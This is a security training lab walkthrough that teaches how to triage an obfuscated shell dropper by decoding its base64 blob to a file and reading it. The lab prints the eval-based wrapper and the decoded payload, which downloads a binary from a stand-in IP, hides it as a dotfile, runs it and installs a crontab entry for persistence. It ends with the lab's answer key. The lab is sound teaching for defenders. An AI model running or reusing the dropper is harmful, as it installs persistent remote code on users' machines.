## BRIEF
`dropper.sh` shows the *shape* of an obfuscated dropper: a base64 blob
(`payload.b64`) decoded and handed straight to a builtin that re-parses
text as code, unseen, at the moment it runs. Obfuscation has no
legitimate reason to appear in a script you're auditing — its only job is
to delay you finding out what a script does until it's already running.
This lab is triage: decode the blob **to a file** and read it, exactly
like a malware analyst would. You never run `dropper.sh`, and you never
pipe the decode into a shell — decoding is safe; *executing the decoded
result* is the thing that isn't.

## GUIDED STEPS

1. Read the wrapper first — do not run it, ever:

       cat dropper.sh

   ```sh
   #!/bin/sh
   # TEACHING SAMPLE — intentionally flawed / obfuscated (malware-style). Do NOT run.
   # dropper.sh — shows the SHAPE of the obfuscation. Read-only reference.
   P="$(cat payload.b64)"
   eval "$(printf '%s' "$P" | base64 -d)"
   ```

   This is the obfuscation pattern itself: read a blob, decode it, and
   re-parse the result as code — all in one line, so nothing is ever
   visible on disk as plain shell text. `eval` is doing exactly what it
   did in L3.7: turning decoded *data* into executed *code*, except now
   the data is hidden behind base64 too.

2. Look at the blob:

       cat payload.b64

   captured output:

       IyEvYmluL3NoCmN1cmwgLWZzU0wgaHR0cDovLzIwMy4wLjExMy45L2FnZW50LmJpbiAtbyAvdG1wLy5hCmNobW9kICt4IC90bXAvLmEKKC90bXAvLmEgJikKZWNobyAnKi81ICogKiAqICogL3RtcC8uYScgfCBjcm9udGFiIC0K

   Unreadable — that's the point. You cannot audit this by looking at it.

3. Decode it — **to a file, never through a pipe into any shell**:

       base64 -d payload.b64 > decoded.txt

   This is the one rule that matters in this whole lab: `base64 -d blob >
   file` is always safe — you're just converting bytes. `base64 -d blob |
   sh` is never safe — you're handing an unread, unverified program
   straight to an interpreter. The difference is `>` versus `|`, and nothing
   else.

4. Read what you decoded:

       cat decoded.txt

   captured output:

       #!/bin/sh
       curl -fsSL http://203.0.113.9/agent.bin -o /tmp/.a
       chmod +x /tmp/.a
       (/tmp/.a &)
       echo '*/5 * * * * /tmp/.a' | crontab -

   Four things, in order: it downloads a binary from a hardcoded address
   over plain HTTP; it saves that binary as `.a` — a dotfile, invisible to
   a plain `ls`; it launches that binary in the background; and it installs
   a crontab entry so the binary relaunches every 5 minutes even after a
   reboot kills the first copy. There is no legitimate installer that needs
   to hide its own downloaded binary behind a dot.

5. Render your verdict. Write `answers.txt`:

       verdict=malicious
       flag1=obfuscation
       flag2=remote-download
       flag3=hidden-file
       flag4=persistence
       c2=203.0.113.9

6. `lab check bash L4.5`
